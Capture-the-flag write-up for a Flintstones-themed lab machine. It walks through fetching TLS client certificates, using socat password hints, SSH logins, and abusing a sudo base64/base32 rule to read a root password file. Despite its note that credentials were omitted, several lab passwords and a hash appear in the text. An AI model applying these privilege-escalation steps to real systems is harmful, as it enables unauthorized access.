## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Server trouble in Bedrock.
**Fred Flintstone   &   Barney Rubble!**  

Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...

- He was able to establish `nginx` on port `80`,  redirecting to a custom TLS webserver on port `4040`
- There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
- There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
- Can you find all the Easter eggs?

_Please allow an extra few minutes for the VM to fully startup﻿._
```

## IP-Address
```IP-Address
10.49.172.248
```

## RustScan 
```bash
PORT      STATE SERVICE      REASON         VERSION
22/tcp    open  ssh          syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http         syn-ack ttl 62 nginx 1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main? syn-ack ttl 62
9009/tcp  open  pichat?      syn-ack ttl 62
54321/tcp open  ssl/unknown  syn-ack ttl 62
```

## WEB
- Port `80` redirect to port `4040`
```html
Port 80
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```
- Port 4040
```html
<!DOCTYPE html>
<html>
  <head>
    <title>ABC</title>
    <style>
      body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
      }
    </style>
  </head>
  <body>
    <h1>Welcome to ABC!</h1>
    <p>Abbadabba Broadcasting Compandy</p>
    <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
    <p>Barney is helping to setup the server, and he said this info was important...</p>
<pre>
Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...
He said it was from the toilet and OVER 9000!
Need to try and secure connections with certificates...
</pre>
  </body>
</html>
```

- Port `4040` redirects to Port `9000` but in scan its `9009`
- Port `9009` got this 
```bash
$ telnet 10.49.135.171 9009
Trying 10.49.135.171...
Connected to 10.49.135.171.
Escape character is '^]'.
 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|

What are you looking for? help
Looks like the secure login service is running on port: 54321
Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
What are you looking for? file
Sorry, unrecognized request: 'file'
You use this service to recover your client certificate and private key
What are you looking for?
```

#### Important 
```bash
$ socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```

#### Files 
- Sounds like you forgot your certificate. Let's find it for you...
```bash
$ socat stdio ssl:10.49.135.171:54321,cert=client.crt,key=client.key,verify=0
```
##### rsa 
```bash
-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNjAxMzAxNzUxMzJaFw0yNzAxMzAxNzUxMzJaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDDBQkf
GNyfZwkB4zAyrM5ANKSKEdpZsCKUx9hIT6TQ+tPrrOL9jvKu2GMPY6Q8PrTx6hQP
CoTHOkwstzPDbr1lraVf1q8mPZFwSG9uJVcMDQ/PDm4xkpl41ihnDaBOuclX2JRt
7EDlxvYzdecvjSUnoDwx1jjCwgUcpJ7FWR6fGOZjboppyvxoUSZ6jGcdg+l1+MTo
7fPX0e5ts+HgsuW7QLm8syYKW22Vn2/NgmhHqUUrf9u0it3KQF21SXVe007vLGFD
qzSJl7Q57up55zCWHY7TYV2Sw4tBkHRD+IP1VOMw/qk/UzTOHFL1/vLObwsal6Tf
rYUK1ZDJ5JMUCkDJAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAGhGXX4QdA5GifZT
8oT51/K5j8/t3GEM8XP0pTgZtit0NaQgcsm1z62LX8FAkKXRNynS1icseIllsx7r
Hf7pU8/POth4JXiuggBeGRT3xXjM3Gb11EsJ/gbvXWXEDEZ0WI3zAJ+40PI0cDX9
0m/8oVc9AquoBmyfvTmAb6QKof6sVQsoaIDVfxfyI8uCUBTzunp3oZ0WOGSx3a/+
IHe2zCgSW6FSBonOTqfGLH7cewFUkcorWCXyXqTR6BtcR45lk2jhbxS5ERR30Jp/
kG8j47fHDdokTkLGRZbbl4gDVsqAUKRFjEk9rRwrVDrIrozLrV+EFuUatKEwl/A2
CQUv4MM=
-----END CERTIFICATE-----
```
- Private key - What are you looking for? private key
Sounds like you forgot your private key. Let's find it for you...

```bash
-----BEGIN RSA PRIVATE KEY-----
[private key omitted]
-----END RSA PRIVATE KEY-----
```

#### Command
```bash
$ $ socat stdio ssl:10.49.135.171:54321,cert=client.crt,key=client.key,verify=0

2026/01/30 13:19:39 socat[15511] W refusing to set empty SNI host name


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck> whoami
Current user = 'Barney Rubble' (valid peer certificate)
b3dr0ck> id
Unrecognized command: 'id'
This service is for login and password hints
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> 
```

- Hint is the actual password 
```creds
username : barney
Passwored: d1ad7c0a3805955a35eb260dab4180dd
```

## SSH
```bash
$ ssh barney@10.49.135.171
Password: [password omitted]
barney@ip-10-49-135-171:~$ ls -la
total 28
drwxr-xr-x 3 barney barney 4096 Apr 30  2022 .
drwxr-xr-x 6 root   root   4096 Jan 30 17:51 ..
-rw------- 1 barney barney   38 Apr 29  2022 barney.txt
lrwxrwxrwx 1 barney barney    9 Apr 28  2022 .bash_history -> /dev/null
-rw-r--r-- 1 barney barney  220 Apr 10  2022 .bash_logout
-rw-r--r-- 1 barney barney 3771 Apr 10  2022 .bashrc
drwx------ 2 barney barney 4096 Apr 30  2022 .cache
-rw-r--r-- 1 root   root      0 Apr 30  2022 .hushlogin
-rw-r--r-- 1 barney barney  807 Apr 10  2022 .profile
lrwxrwxrwx 1 root   root      9 Apr 29  2022 .viminfo -> /dev/null
barney@ip-10-49-135-171:~$ cat barney.txt 
[flag omitted]
```

#### User Flag
- Barney - [flag omitted]

## More Explore
- `fred` files
```crt
-----BEGIN CERTIFICATE-----
MIICnjCCAYYCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNjAxMzAxODU0NTBaFw0yNjAxMzExODU0NTBaMBUxEzARBgNVBAMMCmZy
ZWRjc3JwZW0wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDX+fUFagxG
Ntv9u5NOAGHGGKL07ZUXcmJSiJi6oGUUTd1xZ9zNZ1YIe+Clrhzo8kHx8LD/BiDN
FlUtDJPk+oX/GNsb2N6GRWVb7jZTeIgBhqIf0Aj/A7jk8emFGkTrM4Neay4NdRUg
NNQ92K1OLAQ8tpn9h8eDgt9sEJvf9PdBE57m/5D06LXhQ619QuBBRUDAhq4YXpu8
Npc69DuvMGElnI71KGjFrGlaCY9V8HlWnaS+G/EnpDyF/F7g6ygwOUDIW5svWZHz
ktmzgOcH3ipYfO2S90bCHd7bR3+TQot/9UGTjGse/gSRCIuk+OESzdz0faKnYp+Y
FH40cFn1Tna9AgMBAAEwDQYJKoZIhvcNAQELBQADggEBAKoQbG35dXo5r3WEyt1H
JBMHG5UR/bJjGJZ+Wu8tSj2upkpEZeyjTCbZ3gtUoPAEdxWvsx2WWUfbg+/TsMSq
81qu9FMsirhNMc/64xfDerlDusPRy9e9Yvm6qlP1Rti28YWTcr8JKeY2ITj38+5G
7pWbneM5kbEwTZb5nmPrYKDQyK8oKg0rzDf85M3hcKUwFXgdzH4MDs+/MqxGQPz2
902O0nKRjSg0Aobb+OSrtd8yw04ssMjJ8KPjoByiSXqB4gAhg8OJtmut5/pK0Xij
SgElFAPKh/uAhjZCbBkk1FOucqmY7bTrvGOOc4GpeeERK9haEuTPSlu0SGKETwb+
bZ0=
-----END CERTIFICATE-----
```

- Private Key
```key
-----BEGIN RSA PRIVATE KEY-----
[private key omitted]
-----END RSA PRIVATE KEY-----
```

-  New Login on Port `54321`
```bash
$ socat stdio ssl:10.49.135.171:54321,cert=fred.crt,key=fred.key,verify=0
2026/01/30 13:55:38 socat[33577] W refusing to set empty SNI host name
 __     __   _     _             _____        _     _             _____        _
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)

Welcome: 'fredcsrpem' is authorized.
b3dr0ck> password
Password hint: YabbaDabbaD0000! (user = 'fredcsrpem')
```
- Fred's Password = [password omitted]
##### Fred's Login
```bash
barney@ip-10-49-135-171:~$ su fred
Password: 
fred@ip-10-49-135-171:/home/barney$ cd
fred@ip-10-49-135-171:~$ ls 
fred.txt 
fred@ip-10-49-135-171:~$ cat fred.txt 
[flag omitted]
```

## User Flag
- Fred's Flag = [flag omitted]
##### Permision
```bash
fred@ip-10-49-135-171:~$ sudo -l
Matching Defaults entries for fred on ip-10-49-135-171:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on ip-10-49-135-171:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

## Escaltion
```bash
$ sudo /usr/bin/base64 /root/pass.txt | base64 -d
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
$ sudo /usr/bin/base32 /root/pass.txt | base32 -d
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
$ echo LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK | base32 -d
YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK
$ echo YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK | base64 -d
[flag/hash omitted]
```
- MD5 hash `a00a12aad6b7c16bf07032bd05a31d56` 
- Decoded as `flintstonesvitamins`
- Login  as `root`
```bash
fred@ip-10-49-135-171:~$ su root
Password: [password omitted]
root@ip-10-49-135-171:/home/fred# cd
root@ip-10-49-135-171:~# ls
pass.txt  root.txt  snap
root@ip-10-49-135-171:~# cat root.txt
[flag omitted]
```

## Root Flag
- Root's Flag = [flag omitted]

## END
